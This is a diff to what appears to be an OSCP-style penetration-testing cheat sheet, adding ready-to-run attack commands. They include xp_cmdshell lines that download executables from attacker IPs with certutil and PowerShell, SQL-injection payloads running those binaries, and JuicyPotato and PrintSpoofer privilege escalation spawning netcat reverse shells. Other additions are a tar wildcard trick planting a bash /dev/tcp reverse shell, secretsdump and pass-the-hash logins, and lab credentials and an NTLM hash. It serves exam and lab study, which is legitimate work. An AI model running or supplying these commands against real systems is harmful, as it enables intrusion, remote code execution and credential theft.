@@ -195,6 +195,7 @@ export XTERM=xterm
 python bloodhound.py -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 -ns 192.168.119.122 -c All
 bloodhound-python -u Fiona.Clarck -p Summer2023 -d nagoya-industries.com -v --zip -c All -dc nagoya-industries.com -ns 192.168.119.122
 ```
+If 'bloodhound-python' is not found you can use the command with the full path "sudo python /home/kali/.local/bin/bloodhound-python"
 
 ## LDAP
 
@@ -209,11 +210,13 @@ nmap -n -sV --script "ldap* and not brute" 192.168.231.122
 ```jsx
 impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip frizzdc.frizz.htb
 export KRB5CCNAME=<USERNAME>.ccache
+impacket-GetUserSPNs -request -dc-ip 10.10.150.146 oscp.exam/web_svc
 ```
 
 ## xp_cmdshell 
 
 ```jsx
+impacket-mssqlclient sql_svc:'Dolphin1'@10.10.111.148 -windows-auth
 enable_xp_cmdshell
 xp_cmdshell whoami
 EXECUTE sp_configure 'show advanced options', 1;
@@ -221,6 +224,9 @@ RECONFIGURE;
 EXECUTE sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 EXECUTE xp_cmdshell 'whoami';
+
+EXECUTE xp_cmdshell 'powershell iwr -uri http://192.168.45.237:4444/sql.exe -OutFile C:/Users/Public/sql.exe';
+EXECUTE xp_cmdshell 'certutil -split -urlcache -f http://192.168.45.237:8080/chisel.exe C:\Users\eric.wallows\chisel.exe';
 
 ' UNION SELECT NULL,NULL;EXEC xp_cmdshell 'certutil -split -urlcache -f http://192.168.45.217:8000/agent.exe c:\windows\temp\agent.exe';--
 ' UNION SELECT NULL,NULL;EXEC xp_cmdshell 'c:\windows\temp\rp.exe'--
@@ -331,12 +337,137 @@ Giving the right accesses to  id_rsa
 </aside>
 
 ```jsx
+cp .ssh/id_rsa.pub .ssh/authorized_keys
+```
+
+```jsx
 chmod 600 id_rsa
 ```
 
 ```jsx
 ssh -i 'id_rsa' john@192.168.202.149
 ```
+
+<aside>
+ https://serverfault.com/questions/989678/locked-out-of-my-own-server-getting-too-many-authentication-failures-right-aw
+</aside>
+
+```jsx
+ssh -o "IdentitiesOnly yes" -i root root@127.0.0.1
+```
+
+## SeImpersonatePrivilege
+
+```jsx
+.\PrintSpoofer64.exe -i -c powershell.exe
+```
+
+```jsx
+.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "whoami"
+.\JuicyPotatoNG.exe -t * -p "C:\Users\Public\nc64.exe" -a "10.10.111.147 4444 -e cmd.exe"
+./JuicyPotatoNG.exe -t * -p "C:\Users\tony\Desktop\rev.exe"
+```
+
+```jsx
+.\Potatox86.exe -t * -p "C:\wamp\www\nc.exe" -a "192.168.45.158 1234 -e cmd.exe" -l 9090 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
+```
+
+### Overview with common builds
+
+| Windows release (example build)                           |                                               PrintSpoofer |                                                JuicyPotato |                                       RoguePotato |                                          JuicyPotatoNG |                                      GodPotato / GodPotato-NG | Notes / Key mitigations                                                                           |
+| --------------------------------------------------------- | ---------------------------------------------------------: | ---------------------------------------------------------: | ------------------------------------------------: | -----------------------------------------------------: | ------------------------------------------------------------: | ------------------------------------------------------------------------------------------------- |
+| **Windows 7 / Server 2008 R2** (6.1 / ≤7601)              |                                                    ✅ Works |                                                    ✅ Works |                                           ✅ Works |                                                ✅ Works |                                                       ✅ Works | Classic PoCs fully reliable; older kernel and RPC behavior.                                       |
+| **Windows 8 / 8.1** (6.2 / 6.3 / ≤9600)                   |                                                    ✅ Works |                                                    ✅ Works |                                           ✅ Works |                                                ✅ Works |                                                       ✅ Works | Similar to Win7-era; no major mitigations present.                                                |
+| **Windows 10 1507 → 1709** (10240 / 14393 / 16299)        |                                                    ✅ Works |                                                    ✅ Works |                                           ✅ Works |                                                ✅ Works |                                                       ✅ Works | All PoCs functional on unpatched installs; early Win10 builds vulnerable.                         |
+| **Windows 10 1803 / 1809** (17134 / 17763)                |                                        ✅ Works (pre-patch) | ⚠️ Works on unpatched; reliability drops after cumulatives |                          ✅ RoguePotato fills gaps |                                       ⚠️ Mixed results |                                           ✅ Works (pre-patch) | Microsoft patches (2019–2021) changed RPC/COM behavior; RoguePotato improves reliability.         |
+| **Windows 10 1903 / 1909** (18362 / 18363)                |          ⚠️ Works if unpatched; mitigated by July‑2021 KBs |      ⚠️ Works on unpatched; may fail post‑KB5004946 (1909) |                         ✅ Often works (pre-patch) |                                       ⚠️ Mixed results |                ✅ Works on unpatched; mitigated by cumulatives | Cumulative updates reduce exploitability; patch level critical.                                   |
+| **Windows 10 2004 / 20H2 / 21H1** (19041 / 19042 / 19043) | ⚠️ Works on unpatched; mitigated after July‑2021 KB5004945 |                                         ⚠️ Works pre-patch |                 ✅ RoguePotato effective pre-patch |                 ⚠️ Mixed; NG variants try newer builds |                   ⚠️ May work on unpatched / specific configs | July‑2021 OOB updates hardened named pipes / RPC endpoints; configuration-dependent.              |
+| **Windows 10 21H2 / 22H2** (19044 / 19045 / 22621)        |                                      ❌ Generally mitigated |                                      ❌ Largely ineffective | ⚠️ RoguePotato may work in rare unpatched configs |                               ⚠️ Limited / conditional | ⚠️ NG variants claim some coverage depending on configuration | Newer Win10/11 builds hardened RPC, COM, impersonation, and print-spooler services.               |
+| **Windows 11 / Server 2022** (22000 / 20348+)             |                                            ❌ Not effective |                                            ❌ Not effective |                                   ❌ Not effective |                        ⚠️ NG variants very conditional |           ⚠️ NG variants may work in some research/test cases | Modern LPE mitigations; successful PoC extremely rare; depends on patch level and service config. |
+| **Windows Server 2016** (14393)                           |                                        ✅ Works (pre-patch) |                                                    ✅ Works |                                           ✅ Works |                                 ⚠️ Mixed / conditional |                                           ✅ Works (pre-patch) | Cumulative updates affect success; early PoCs reliable.                                           |
+| **Windows Server 2019** (17763)                           |                                       ⚠️ Works (pre-patch) |                                       ⚠️ Works (pre-patch) |                       ✅ RoguePotato more reliable |                         ⚠️ Mixed; NG variants may work |                            ⚠️ GodPotato may succeed pre-patch | Patches (e.g., July‑2021 KBs) mitigate most classic PoCs.                                         |
+| **Windows Server 2022** (20348+)                          |                                      ❌ Generally mitigated |                                            ❌ Not effective |                                   ❌ Not effective | ⚠️ NG variants possible only in research / conditional |           ⚠️ NG variants may work in research; not guaranteed | Modern hardening; fully patched builds prevent classic LPE exploits.                              |
+
+## impacket-secretsdump
+
+<aside>
+SAM & LSA extracation
+</aside>
+
+```jsx
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
+## evil-winrm
+
+<aside>
+Connect with NTLM hash and pass
+</aside>
+
+```jsx
+evil-winrm -i 10.10.111.146 -u "tom_admin" -H 4979d69d4ca66955c075c41cf45f24dc
+evil-winrm -i 10.10.112.154 -u 'Administrator' -p 'hghgib6vHT3bVWf'
+```
+
+## smbclient
+
+```jsx
+smbclient -L 192.168.221.189 -N 
+smbclient //10.10.111.148/ -U 'oscp.exam/web_svc%Diamond1'
+smbclient -U 'guest' \\\\<smb $IP>\\<share name>
+prompt off
+recurse on
+mget *
+```
+
+
+## GPGOrchestrator
+
+<aside>
+More info on: https://www.exploit-db.com/exploits/50558
+</aside>
+
+```jsx
+ren GPGService.exe GPGServiceOLD.exe
+ren evil.exe GPGService.exe
+smbclient -U 'guest' \\\\<smb $IP>\\<share name>
+net stop GPGOrchestrator
+net start GPGOrchestrator
+```
+## wilcards
+
+<aside>
+More info on: https://www.exploit-db.com/exploits/50558
+</aside>
+
+```jsx
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'
+echo 'bash -i >& /dev/tcp/192.168.45.212/4444 0>&1' > shell.sh
+chmod +x shell.sh
+```
+## snmpwalk
+
+<aside>
+More info on: https://www.exploit-db.com/exploits/50558
+</aside>
+
+```jsx
+snmpwalk -v1 -c public 192.168.220.156
+snmpwalk -v1 -c public 192.168.220.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+```
+
+## sudo -l
+
+Check always https://gtfobins.github.io/
+
+# PHP
+
+```jsx
+/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
+```
+
+
 
 
 
@@ -369,6 +500,30 @@ Get-ChildItem . -Force
 ```
 
 <aside>
+Get file info (Powershell)
+</aside>
+
+```jsx
+Get-ItemProperty -Path C:\Users\eric.wallows\admintool.exe | Format-list -Property * -Force
+```
+
+<aside>
+See file rights (Powershell)
+</aside>
+
+```jsx
+Get-Acl .\admintool.exe
+```
+<aside>
+Powershell history
+</aside>
+
+```jsx
+(Get-PSReadlineOption).HistorySavePath
+cat C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+<aside>
 Print time of the host
 </aside>
 
@@ -392,3 +547,20 @@ Get file info on windows
 ```jsx
 <filename> qc
 ```
+
+<aside>
+Extra meta data with exiftool
+</aside>
+
+```jsx
+exiftool -a -G1 FUNCTION-TEMPLATE.pdf
+```
+
+<aside>
+Extra data with strings
+</aside>
+
+```jsx
+strings /usr/local/bin/redis-status
+```
+
